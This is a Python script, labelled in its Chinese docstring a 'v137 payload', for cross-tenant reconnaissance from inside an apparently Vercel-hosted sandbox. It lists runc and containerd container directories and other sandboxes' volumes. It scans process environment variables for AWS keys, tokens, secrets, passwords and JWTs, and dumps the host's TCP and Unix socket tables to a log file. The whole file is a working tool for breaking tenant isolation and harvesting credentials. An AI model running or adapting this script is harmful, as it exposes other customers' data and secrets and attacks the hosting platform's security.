# -*- coding: utf-8 -*-
"""v137 payload: 跨租户侦察 - /run/cell/runc 容器清单 + containerd 容器目录 + 进程 environ 扫描 + host 端口
目标: 同 cell VM 其他 sandbox 的容器/数据
输出 /vercel/sandbox/v137c.out"""
import socket, struct, time, json, os, signal

OUT = '/vercel/sandbox/v137c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rd(path, n=4000):
    try:
        return open(path, 'rb').read(n)
    except Exception as e:
        return 'EXC %s' % str(e).encode()


def ls(path):
    try:
        return os.listdir(path)
    except Exception as e:
        return 'EXC %s' % str(e)


# 1: /run/cell 全览
log('=== 1 /run/cell ===')
for p in ['/run/cell', '/run/cell/runc', '/run/cell/apm', '/run/cell/metrics',
          '/var/run/cell', '/var/lib/containerd', '/var/lib/containerd/io.containerd.runtime.v2.task/default',
          '/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots',
          '/var/run', '/mnt/drives', '/mnt/drives/sandbox']:
    log('ls %s = %s' % (p, ls(p)))

# 2: 进程 environ 全扫描
log('=== 2 proc environ scan ===')
procs = {}
for d in os.listdir('/proc'):
    if d.isdigit():
        try:
            procs[int(d)] = open('/proc/%s/comm' % d).read().strip()
        except Exception:
            pass
for p, c in sorted(procs.items()):
    if p < 1000 or c in ('containerd', 'sandboxctrl', 'sandbox-init'):
        try:
            env = open('/proc/%d/environ' % p, 'rb').read(3000)
            cmd = open('/proc/%d/cmdline' % p, 'rb').read(300).replace(b'\x00', b' ')
            hits = [k for k in (b'AWS', b'TOKEN', b'SECRET', b'KEY', b'PASS', b'CRED', b'JWT', b'API') if k in env]
            if hits or c in ('containerd', 'sandboxctrl', 'sandbox-init', 'celld'):
                log('proc %d %s cmd=%r env=%r hits=%s' % (p, c, cmd.decode(errors='replace')[:150],
                                                          env.decode(errors='replace').replace('\x00', ' | ')[:800], hits))
        except Exception:
            pass

# 3: host 监听端口
log('=== 3 host ports ===')
try:
    tcp = rd('/proc/net/tcp', 6000).decode(errors='replace')
    log('tcp:\n' + tcp[:3000])
except Exception:
    pass
try:
    tcp6 = rd('/proc/net/tcp6', 4000).decode(errors='replace')
    log('tcp6:\n' + tcp6[:2000])
except Exception:
    pass
try:
    unix = rd('/proc/net/unix', 4000).decode(errors='replace')
    log('unix:\n' + unix[:2500])
except Exception:
    pass

# 4: 其他 sandbox 痕迹
log('=== 4 sandbox traces ===')
for p in ['/volumes', '/volumes/run', '/volumes/run/vercel', '/volumes/run/vercel/share',
          '/run/containerd', '/run/containerd/io.containerd.runtime.v2.task/default']:
    log('ls %s = %s' % (p, ls(p)))

log('V137_DONE')
f.close()
